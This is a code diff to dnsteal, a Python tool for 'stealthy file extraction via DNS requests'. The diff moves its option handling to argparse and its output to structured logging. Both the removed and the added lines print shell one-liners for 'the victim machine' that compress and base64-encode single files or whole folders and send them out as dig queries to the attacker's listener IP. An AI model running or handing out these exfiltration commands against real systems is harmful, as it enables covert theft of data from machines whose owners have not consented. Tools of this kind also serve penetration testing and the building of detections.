@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 #  g0dmode
 ########################
+import argparse
 import base64
 import binascii
 import hashlib
@@ -254,142 +255,144 @@ def save_file(key, value, z):
     logger.info("Saved file", file=fname, md5sum=md5sum)
 
 
-def usage(str=""):
-
-    banner()
-    print(f"Usage: python {sys.argv[0]} [listen_address] [options]")
-    print("\nOptions:")
-    print("\t-z\tUnzip incoming files.")
-    print("\t-v\tVerbose output.")
-    print("\t-h\tThis help menu")
-    print()
-    print("Advanced:")
-    print("\t-b\tBytes to send per subdomain                 (default = 57, max=63)")
-    print(
-        "\t-s\tNumber of data subdomains per request       (default =  4, ie. $data.$data.$data.$data.$filename)"
-    )
-    print("\t-f\tLength reserved for filename per request    (default = 17)")
-    print()
-    print(f"{c['g']}$ python {sys.argv[0]} -z 127.0.0.1{c['e']}")
-    print()
-    print(
-        f"{c['r']}-------- Do not change the parameters unless you understand! --------{c['e']}"
-    )
-    print()
-    print("The query length cannot exceed 253 bytes. This is including the filename.")
-    print("The subdomains lengths cannot exceed 63 bytes.")
-    print()
-    print("Advanced: ")
-    print(
-        f"\t{sys.argv[0]} 127.0.0.1 -z -s 4 -b 57 -f 17\t4 subdomains, 57 bytes => (57 * 4 = 232 bytes) + (4 * '.' = 236). Filename => 17 byte(s)"
-    )
-    print(
-        f"\t{sys.argv[0]} 127.0.0.1 -z -s 4 -b 55 -f 29\t4 subdomains, 55 bytes => (55 * 4 = 220 bytes) + (4 * '.' = 224). Filename => 29 byte(s)"
-    )
-    print(
-        f"\t{sys.argv[0]} 127.0.0.1 -z -s 4 -b 63 -f  1\t4 subdomains, 63 bytes => (62 * 4 = 248 bytes) + (4 * '.' = 252). Filename =>  1 byte(s)"
-    )
-    print()
-    print(str)
-
-
 def p_cmds(s, b, ip, z):
 
-    print(
-        f"{c['g']}[+]{c['e']} On the victim machine, use any of the following commands:"
-    )
-    print(
-        f"{c['g']}[+]{c['e']} Remember to set {c['y']}filename{c['e']} for individual file transfer."
-    )
-    print()
-
+    logger.info("On the victim machine, use any of the following commands:")
+    logger.info("Remember to set filename for individual file transfer.")
     if z:
-        print(f"{c['y']}[?]{c['e']} Copy individual file (ZIP enabled)")
-        print(
-            f"\t{c['r']}\x23{c['e']} {c['y']}f=file.txt{c['e']}; s={s};b={b};c=0;ix=0; "
-            'for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do '
-            'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); '
-            f'do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done; '
-            f'dig @{ip} `echo 3x7-.0-.$f|tr "+" "*"`'
+        logger.info(
+            "Copy individual file (ZIP enabled)",
+            cmd=(
+                f"\t{c['r']}\x23{c['e']} {c['y']}f=file.txt{c['e']}; s={s};b={b};c=0;ix=0; "
+                'for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do '
+                'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); '
+                f'do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done; '
+                f'dig @{ip} `echo 3x7-.0-.$f|tr "+" "*"`'
+            ),
         )
-        print()
-        print(f"{c['y']}[?]{c['e']} Copy entire folder (ZIP enabled)")
-        print(
-            f"\t{c['r']}\x23{c['e']} for f in $(ls .); do s={s};b={b};c=0;ix=0; "
-            'for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do '
-            'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); '
-            f'do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done; '
-            f'dig @{ip} `echo 3x7-.0-.$f|tr "+" "*"`; done;'
+        logger.info(
+            "Copy entire folder (ZIP enabled)",
+            cmd=(
+                f"\t{c['r']}\x23{c['e']} for f in $(ls .); do s={s};b={b};c=0;ix=0; "
+                'for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do '
+                'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); '
+                f'do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done; '
+                f'dig @{ip} `echo 3x7-.0-.$f|tr "+" "*"`; done;'
+            ),
         )
-        print()
     else:
-        print(f"{c['y']}[?]{c['e']} Copy individual file")
-        print(
-            f"\t{c['r']}\x23{c['e']} {c['y']}f=file.txt{c['e']}; s={s};b={b};c=0;ix=0; "
-            'for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\\n/g");do '
-            'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); '
-            f'else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done; '
-            f'dig @{ip} `echo 3x7-.0-.$f|tr "+" "*"`'
+        logger.info(
+            "Copy individual file",
+            cmd=(
+                f"f=file.txt{c['e']}; s={s};b={b};c=0;ix=0; "
+                'for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\\n/g");do '
+                'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); '
+                f'else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done; '
+                f'dig @{ip} `echo 3x7-.0-.$f|tr "+" "*"`'
+            ),
         )
-        print()
-        print("{c['y']}[?]{c['e']} Copy entire folder")
-        print(
-            f"\t{c['r']}\x23{c['e']} for f in $(ls .); do s={s};b={b};c=0;ix=0; "
-            'for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do '
-            'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else '
-            f'echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short; ix=$(($ix+1)); done; '
-            f'dig @{ip} `echo 3x7-.0-.$f|tr "+" "*"`; done;'
+        logger.info(
+            "Copy entire folder",
+            cmd=(
+                f"for f in $(ls .); do s={s};b={b};c=0;ix=0; "
+                'for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do '
+                'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else '
+                f'echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short; ix=$(($ix+1)); done; '
+                f'dig @{ip} `echo 3x7-.0-.$f|tr "+" "*"`; done;'
+            ),
         )
-        print()
 
 
 def banner():
-
-    print("\033[1;32m", end=" ")
-    print(
-        f"""
-      ___  _  _ ___ _            _
-     |   \| \| / __| |_ ___ __ _| |
-     | |) | .` \__ \  _/ -_) _` | |
-     |___/|_|\_|___/\__\___\__,_|_|v{VERSION}
+    return f"""
+\033[1;32m___  _  _ ___ _            _
+|   \| \| / __| |_ ___ __ _| |
+| |) | .` \__ \  _/ -_) _` | |
+|___/|_|\_|___/\__\___\__,_|_|v{VERSION}
 
 -- https://github.com/m57/dnsteal.git --\033[0m
 
 Stealthy file extraction via DNS requests
-"""
-    )
+        """
 
 
 if __name__ == "__main__":
     ###########################
 
-    z = False
-    s = 4
-    b = 57
-    flen = 17
-    v = False
+    parser = argparse.ArgumentParser(
+        description=banner()
+        + """
+-------- Do not change the parameters unless you understand! --------
+The query length cannot exceed 253 bytes. This is including the filename.
+The subdomains lengths cannot exceed 63 bytes.
+
+Advanced:\n"""
+        + f"\t{sys.argv[0]} 127.0.0.1 -z -s 4 -b 57 -f 17\t4 subdomains, 57 bytes => (57 * 4 = 232 bytes) + (4 * '.' = 236). Filename => 17 byte(s)\n"
+        + f"\t{sys.argv[0]} 127.0.0.1 -z -s 4 -b 55 -f 29\t4 subdomains, 55 bytes => (55 * 4 = 220 bytes) + (4 * '.' = 224). Filename => 29 byte(s)\n"
+        + f"\t{sys.argv[0]} 127.0.0.1 -z -s 4 -b 63 -f  1\t4 subdomains, 63 bytes => (62 * 4 = 248 bytes) + (4 * '.' = 252). Filename =>  1 byte(s)\n",
+        formatter_class=argparse.RawTextHelpFormatter,
+    )
+    parser.add_argument(
+        "-v",
+        dest="v",
+        action="store_true",
+        help="Increase log verbosity.",
+    )
+    parser.add_argument(
+        "-z",
+        dest="z",
+        action="store_true",
+        help="Unzip incoming files.",
+    )
+    parser.add_argument(
+        "-s",
+        type=int,
+        help="Number of data subdomains per request (default =  4, ie. $data.$data.$data.$data.$filename)",
+    )
+    parser.add_argument(
+        "-b", type=int, help="Bytes to send per subdomain (default = 57, max=63)"
+    )
+    parser.add_argument(
+        "-f", type=int, help="Length reserved for filename per request (default = 17)"
+    )
+    parser.add_argument("-l", "--log-file", type=str, help="log file location")
+    parser.add_argument(
+        "--no-color",
+        dest="color",
+        action="store_false",
+        help="Do use color log for console",
+    )
+    parser.add_argument("ip", type=str, help="The IP address to bind to")
+    parser.set_defaults(
+        v=False,
+        z=False,
+        s=4,
+        b=56,
+        f=17,
+        color=True,
+    )
+
+    args = parser.parse_args()
+
+    z = args.z
+    s = args.s
+    b = args.b
+    flen = args.f
+    ip = args.ip
+    log_level = logging.DEBUG if args.v else logging.INFO
+
+    configure_logging(
+        level=log_level,
+        log_file=args.log_file,
+        color=args.color,
+    )
+
     regx_ip = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
 
-    if "-h" in sys.argv or len(sys.argv) < 2:
-        usage()
-        exit(1)
-
-    ip = sys.argv[1]
-
     if re.match(regx_ip, ip) == None:
-        usage(f"{c['r']}[Error]{c['e']} First argument must be listen address.")
+        parser.print_help()
+        logger.error("Invalid listen IP address", ip=ip)
         exit(1)
-
-    if "-z" in sys.argv:
-        z = True
-    if "-s" in sys.argv:
-        s = int(sys.argv[sys.argv.index("-s") + 1])
-    if "-b" in sys.argv:
-        b = int(sys.argv[sys.argv.index("-b") + 1])
-    if "-f" in sys.argv:
-        flen = int(sys.argv[sys.argv.index("-f") + 1])
-    if "-v" in sys.argv:
-        v = True
 
     magic_nr_size = 4
     max_index = 5
@@ -398,12 +401,15 @@ if __name__ == "__main__":
         or ((b * s) > 253)
         or (((b * s) + flen + magic_nr_size + max_index) > 253)
     ):
-        usage(f"{c['r']}[Error]{c['e']} Entire query cannot be > 253. Read help (-h)")
+        parser.print_help()
+        logger.error(
+            "Entire query cannot be > 253. Read help (-h)", s=s, b=b, flen=flen
+        )
+        exit(1)
 
     ############################################################################################
-    banner()
+    print(banner())
 
-    configure_logging()
     udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
     try:
@@ -485,5 +491,5 @@ if __name__ == "__main__":
             # print r_data
 
     except KeyboardInterrupt:
-        print("\n\033[1;31m[!]\033[0m Closing...")
+        logger.info("DNS server stop listening", ip=ip, port=53)
         udp.close()
